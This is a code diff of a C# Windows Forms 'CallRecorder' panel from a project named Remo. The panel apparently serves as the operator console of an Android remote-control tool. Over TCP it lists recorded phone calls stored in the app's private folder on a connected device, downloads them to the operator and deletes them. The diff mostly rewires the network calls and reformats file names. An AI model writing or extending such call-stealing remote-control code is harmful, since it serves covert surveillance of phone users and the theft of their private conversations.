@@ -15,7 +15,7 @@ namespace Remo.Features
     public partial class CallRecorder : Form,IFeature
     {
 
-        private string CurrentPath = "/";
+        private string CurrentPath = "/data/data/com.remo/files/Rec";
         public int DATA_TYPE { get; set; }
         public IConnection MainConnection { get; set; }
 
@@ -45,7 +45,7 @@ namespace Remo.Features
                 foreach (string s in files)
                 {
                     if (!String.Empty.Equals(s))
-                        dataGridView1.Rows.Add(new String[] { s, "File" });
+                        dataGridView1.Rows.Add(s.Split('_'));
                 }
 
                 dataGridView1.ScrollBars = ScrollBars.Both; 
@@ -57,7 +57,7 @@ namespace Remo.Features
         private void FileMan_Load(object sender, EventArgs e)
         {
             Console.WriteLine("CallRecorder");
-            ServerFactory.GetInstance().send(((int)DataHandler.eDataType.CALL_RECORDS).ToString(),
+            MainForm.mTCPH.send(((int)DataHandler.eDataType.CALL_RECORDS).ToString(),
                 ((int)DataHandler.eOrderType.START).ToString(),"L="+ CurrentPath,
                     MainConnection.tcpClient);
         }
@@ -73,7 +73,7 @@ namespace Remo.Features
                     CurrentPath += fileName;
                 else
                     CurrentPath += "/" + fileName;
-                ServerFactory.GetInstance().send(((int)DataHandler.eDataType.CALL_RECORDS).ToString(),
+                MainForm.mTCPH.send(((int)DataHandler.eDataType.CALL_RECORDS).ToString(),
                 ((int)DataHandler.eOrderType.UPDATE).ToString(), "L=" + CurrentPath,
                     MainConnection.tcpClient);
             }
@@ -89,7 +89,7 @@ namespace Remo.Features
 
                 foreach(DataGridViewRow r in dataGridView1.SelectedRows)
                 {
-                    ServerFactory.GetInstance().send(((int)DataHandler.eDataType.CALL_RECORDS).ToString(),
+                    MainForm.mTCPH.send(((int)DataHandler.eDataType.CALL_RECORDS).ToString(),
                 ((int)DataHandler.eOrderType.UPDATE).ToString(), "D=" + CurrentPath + "/" + r.Cells[0].Value.ToString() ,
                 MainConnection.tcpClient);
 
@@ -111,13 +111,14 @@ namespace Remo.Features
 
                 if (MainForm.FileDownloader == null || MainForm.FileDownloader.IsDisposed)
                 {
-                    MainForm.FileDownloader = ServerFactory.GetInstance().startFeature(
+                    MainForm.FileDownloader = MainForm.mTCPH.startFeature(
                         (MainConnection.tcpClient.Client.RemoteEndPoint as IPEndPoint).Address.ToString(),
                         (int)DataHandler.eDataType.FM_DOWN);
                     MainForm.FileDownloader.Show();
                     foreach (DataGridViewRow r in dataGridView1.SelectedRows)
                     {
-                        ((FileDownloader)MainForm.FileDownloader).addToList(fbd.SelectedPath,CurrentPath , r.Cells[0].Value.ToString(), ( r.Cells[1].Value.ToString().Equals("Folder")));
+                        string name = r.Cells[0].Value.ToString() + "_" + r.Cells[1].Value.ToString() + "_" + r.Cells[2].Value.ToString() + "_" + r.Cells[3].Value.ToString();
+                        ((FileDownloader)MainForm.FileDownloader).addToList(fbd.SelectedPath, CurrentPath , name, ( r.Cells[1].Value.ToString().Equals("Folder")));
                     }
                 }
                 else
@@ -126,7 +127,8 @@ namespace Remo.Features
 
                     foreach (DataGridViewRow r in dataGridView1.SelectedRows)
                     {
-                        ((FileDownloader)MainForm.FileDownloader).addToList(fbd.SelectedPath,CurrentPath , r.Cells[0].Value.ToString(), ( r.Cells[1].Value.ToString().Equals("Folder")));
+                        string name = r.Cells[0].Value.ToString() + "_" + r.Cells[1].Value.ToString() + "_" + r.Cells[2].Value.ToString() + "_" + r.Cells[3].Value.ToString();
+                        ((FileDownloader)MainForm.FileDownloader).addToList(fbd.SelectedPath, CurrentPath , name, ( r.Cells[1].Value.ToString().Equals("Folder")));
                     }
                 }
             }
@@ -140,7 +142,7 @@ namespace Remo.Features
 
         private void FileMan_FormClosing(object sender, FormClosingEventArgs e)
         {
-            ServerFactory.GetInstance().send(((int)DataHandler.eDataType.CALL_RECORDS).ToString(),
+            MainForm.mTCPH.send(((int)DataHandler.eDataType.CALL_RECORDS).ToString(),
                 ((int)DataHandler.eOrderType.STOP).ToString(),
                     MainConnection.tcpClient);
         }
